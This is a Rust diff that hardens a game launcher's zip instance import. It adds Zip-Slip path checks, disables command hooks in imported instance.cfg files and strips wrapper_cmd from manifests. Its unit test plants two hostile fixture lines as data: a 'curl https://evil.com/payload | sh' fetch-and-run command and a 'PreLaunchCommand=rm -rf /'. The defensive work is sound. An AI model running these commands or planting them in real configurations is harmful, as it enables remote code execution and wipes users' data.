@@ -176,10 +176,16 @@ pub fn import_instance_from_zip(
         // Strict Zip-Slip pre-check
         if entry_name.contains("..") || entry_name.starts_with('/') || entry_name.starts_with('\\')
         {
+            tracing::warn!("[SECURITY] Aborting suspicious Zip-Slip entry name: {entry_name}");
             continue;
         }
 
         let out_path = dest_dir.join(&entry_name);
+        if !out_path.starts_with(&dest_dir) {
+            tracing::warn!("[SECURITY] Aborting Zip-Slip entry escaping destination: {entry_name}");
+            continue;
+        }
+
         if entry.is_dir() {
             fs::create_dir_all(&out_path)?;
         } else {
@@ -188,6 +194,29 @@ pub fn import_instance_from_zip(
             }
             let mut out_file = File::create(&out_path)?;
             std::io::copy(&mut entry, &mut out_file)?;
+        }
+    }
+
+    // Sanitize any dangerous MultiMC / Prism instance.cfg hook commands
+    let mmc_cfg_path = dest_dir.join("instance.cfg");
+    if mmc_cfg_path.is_file() {
+        if let Ok(cfg_content) = fs::read_to_string(&mmc_cfg_path) {
+            let mut sanitized_lines = Vec::new();
+            for line in cfg_content.lines() {
+                let trimmed = line.trim();
+                if trimmed.starts_with("PreLaunchCommand=")
+                    || trimmed.starts_with("PostExitCommand=")
+                    || trimmed.starts_with("WrapperCommand=")
+                {
+                    tracing::warn!(
+                        "[SECURITY] Disabled dangerous hook in imported instance.cfg: {trimmed}"
+                    );
+                    sanitized_lines.push(format!("# DISABLED BY MQ SECURITY: {line}"));
+                } else {
+                    sanitized_lines.push(line.to_string());
+                }
+            }
+            let _ = fs::write(&mmc_cfg_path, sanitized_lines.join("\n"));
         }
     }
 
@@ -200,6 +229,15 @@ pub fn import_instance_from_zip(
         })?;
         m.name = target_name.to_string();
         m.id = slug;
+
+        // Security: strip wrapper_cmd from imported instances to prevent arbitrary code execution
+        if let Some(cmd) = m.wrapper_cmd.take() {
+            tracing::warn!(
+                "[SECURITY] Stripped wrapper_cmd '{cmd}' from imported instance '{}' to prevent arbitrary execution",
+                m.name
+            );
+        }
+
         m.save_to_dir(&dest_dir)?;
         m
     } else {
@@ -210,4 +248,52 @@ pub fn import_instance_from_zip(
     };
 
     Ok(manifest)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_import_strips_wrapper_cmd_and_disables_mmc_hooks() {
+        let tmp = tempfile::tempdir().unwrap();
+        let zip_path = tmp.path().join("malicious.zip");
+        let dest_root = tmp.path().join("instances");
+
+        // Build a zip containing dangerous commands
+        {
+            let file = File::create(&zip_path).unwrap();
+            let mut zip = ZipWriter::new(file);
+            let options =
+                SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
+
+            zip.start_file("instance.toml", options).unwrap();
+            let manifest_content = r#"
+id = "malicious"
+name = "Malicious Modpack"
+mc_version = "1.20.1"
+loader = "Fabric"
+memory_min_mb = 1024
+memory_max_mb = 4096
+wrapper_cmd = "curl https://evil.com/payload | sh"
+created_at = "2026-01-01T00:00:00Z"
+playtime_secs = 0
+lang_initialized = true
+"#;
+            zip.write_all(manifest_content.as_bytes()).unwrap();
+
+            zip.start_file("instance.cfg", options).unwrap();
+            let cfg_content = "name=Malicious\nPreLaunchCommand=rm -rf /\nPostExitCommand=echo done\n";
+            zip.write_all(cfg_content.as_bytes()).unwrap();
+
+            zip.finish().unwrap();
+        }
+
+        let manifest = import_instance_from_zip(&zip_path, &dest_root, None).unwrap();
+        assert_eq!(manifest.wrapper_cmd, None, "wrapper_cmd must be stripped for safety");
+
+        let mmc_cfg = fs::read_to_string(dest_root.join("malicious").join("instance.cfg")).unwrap();
+        assert!(mmc_cfg.contains("# DISABLED BY MQ SECURITY: PreLaunchCommand=rm -rf /"));
+        assert!(mmc_cfg.contains("# DISABLED BY MQ SECURITY: PostExitCommand=echo done"));
+    }
 }
